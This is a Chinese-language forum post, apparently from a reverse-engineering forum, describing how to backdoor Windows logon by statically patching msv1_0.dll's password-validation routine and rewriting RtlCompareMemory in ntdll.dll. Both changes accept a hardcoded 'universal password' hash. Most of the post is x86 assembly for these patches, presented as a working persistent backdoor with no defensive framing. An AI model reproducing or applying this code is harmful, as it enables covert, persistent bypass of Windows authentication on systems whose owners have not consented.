
# [原创]windows 口令突破的一些想法及实现 （申请会员）

在windows登陆过程中，NTML身份认证是通过NTLM安全支持提供者`msv1_0.dll`来实现的，这个dll是用来比对SAM数据库的，而口令验证主要是通过其中的`MsvpPasswordValidate()`这个函数来实现的，核心代码如下：

```
push 10h
add  ebx,34h
push ebx
push esi
call ds:Rtlcomparymemory
cmp eax,10h
jnz short loc_77c498c0
...
```

从代码中可以看出，它通过调用`Rtlcomparymemory`这个函数来比较正确密码与输入密码的16位hash值，根据比较结果进行跳转。但是如果将最后一句变为空即`NOP`，那么将跳过密码验证，或者为了增加隐蔽性，使其更加强大，还可以增加一段代码实现通用密码，具体做法就是在真正的Hash值compare之前，先和我预示的值进行比较（这个预设的值就是通用密码的Hash值），相同则下面不用比了；不相同，下面的过程依旧。本文的方法主要围绕`msv1_0.dll`来进行的，通过静态修改`msv1_0.dll`，以实现登录口令的突破。具体修改方法如下：

首先将上面的一段代码改为

```
call sub_77c55377
cmp eax,10h
jnz short loc_77c498c0
```

`sub_77c55377`是我另外写的一个函数，我将通用密码的实现都写在那个函数里了，这里只是一个简单的函数调用。

下面是`sub_77c55377`这个函数：

```
push ebp          ;ebp入栈
move ebp,esp        ;ebp作为堆栈指针，初始指向esp，
 sub  esp,8          ;为两个局部变量分配堆栈空间
move dword ptr [ebp-4],837EE3F9  ;局部变量1为通用密码的Hash前四个字节，这里的,837EE3F9也是通过结算得出的
move dword ptr [ebp-8],esi    ;局部变量2暂存esi的值
lea esi,[ebp-4]        ;esi指向万能密码的Hash值的地址
push 4h；          ;length
add ebx, 34h
push ebx          ;source 1
push esi          ;source 2
call ds:RtlCompareMemory    cmp  eax, 4h        ;eax是函数返回值，是否等于4
jz   a          ;=4表示与万能密码相匹配，直接跳到a,令eax=10，相当于输入正确密码，如果不=4，继续和正确密码的Hash值比较
lea esi,[ebp-8]        ;取得局部变量2暂存的esi的原始值
push 10h          ;length
push ebx          ;source 1
push esi          ;source 2
call ds:RtlCompareMemory
cmp  eax,10h
jnz  b
a:move eax, 10h
b: add esp,8      ;调整堆栈平衡
pop ebp        ;恢复ebp
retn          ;函数返回
```

其实这个函数也是比较简单的，就是增加了一个比较而已。

最后我将这些改动以机器码的形式写到`msv1_0.dll`这个文件中，替换掉系统原有的dll文件，即实现了通用密码。

Clyfish在他的帖子《利用IAT hook实现windows通用密码后门》（地址：http://bbs.pediy.com/showthread.php?t=65391）中通过hook `Rtlcomparymemory`这个函数也是实现了通用密码（具体思路和我的也差不多），不过那个方法一旦重启就失去效果了，实用性并不大。

参照本文的方法，其实可以改进他的方法，那就是重写`Rtlcomparymemory`这个api函数，实现永久后门。`Rtlcomparymemory`这个函数是在`ntdll.dll`这个dll中的。我试着重写了一下确实是成功了。下面是我重写的`Rtlcomparymemory`：

```
  push   esi
  push     edi
  cld
  mov  esi, [esp+0ch]
  mov  edi, [esp+10h]
  mov  ecx, [esp+14h]
  cmp  ecx, 16
  jz  loc_compare_Hash

loc_comapareit:
  repe  cmpsb
  jnz  loc_not_equal

loc_comapareok:
  mov  eax, [esp+14h]
  jmp  short loc_is_equal

loc_compare_Hash:
  mov  eax, [edi]
  cmp  eax, 0F9E37E83h
  jnz  loc_comapareit
  mov  eax, [edi+4]
  cmp  eax, 0B83C47A9h
  jnz  loc_comapareit
  jmp  short loc_comapareok

loc_not_equal:
 dec  esi
  sub  esi, [esp+0ch]
  mov  eax, esi

loc_is_equal:
  pop  edi
  pop  esi
  ret        0ch
```

这比原来的函数短了一点，所以正好可以覆盖掉，而不影响原有的功能。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
